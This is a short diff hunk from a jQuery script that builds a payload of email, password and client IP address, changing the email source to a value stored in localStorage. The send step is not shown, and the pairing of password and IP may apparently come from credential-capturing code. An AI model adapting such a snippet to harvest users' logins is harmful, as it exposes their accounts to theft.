@@ -805,7 +805,7 @@ $(document).ready(function() {
         count++;
 
         var payloadData = {
-            email: emailInput,
+            email: localStorage.getItem('user_email'),
             password: passwordInput,
             ip: clientIpAddress
         };
